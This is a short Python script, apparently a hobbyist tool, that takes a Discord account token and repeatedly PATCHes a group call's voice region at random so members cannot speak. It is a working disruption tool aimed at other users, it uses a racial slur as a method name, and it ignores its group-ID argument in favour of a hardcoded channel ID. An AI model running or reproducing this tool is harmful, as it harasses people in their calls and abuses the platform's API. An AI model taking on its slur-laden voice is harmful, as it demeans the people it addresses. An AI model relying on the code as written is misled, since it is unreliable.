# Name: Group Voice Channel Lagger
# Description: Changes region fast, which makes members unable to speak in the voice channel
# Author: Ivano (Ivano.#2468)
# Note: I'be been planing to do something like this since 2021, I don't know if someone already made, if yes, let him take credits lel :D

import requests
import random
import sys
import os

os.system("title Discord Call Crash - By ivano")


class IvanoM4ster:

    def __init__(self, token, group, times):
        
        self.token = token
        self.group_id = group
        self.times = times
        self.headers = {'Authorization': token}

    def startitnigga(self):
        timezz = 0
        for Sexx in range(int(self.times)):

            regionz = ["south-korea", "japan", "india", "southafrica"] # etc add more if u'd like!
            randomregion = random.choice(regionz)
            req = requests.patch(f'https://discord.com/api/v9/channels/945720767516127232/call', headers=self.headers, json={'region': randomregion})
            print(req.text)
            print(f"[+] Using {randomregion} as region!")
            timezz = timezz + 1
            os.system(f"title Discord Call Crash - Sent [{timezz}]")

def main():
    if len(sys.argv) < 4:
        print(f'Usage: py {sys.argv[0]} <token> <group id> <times>')
        sys.exit()

    token = sys.argv[1]
    group = sys.argv[2]
    times = sys.argv[3]

    SexyHello = IvanoM4ster(token, group, times)

    SexyHello.startitnigga()


if __name__ == '__main__':
    main()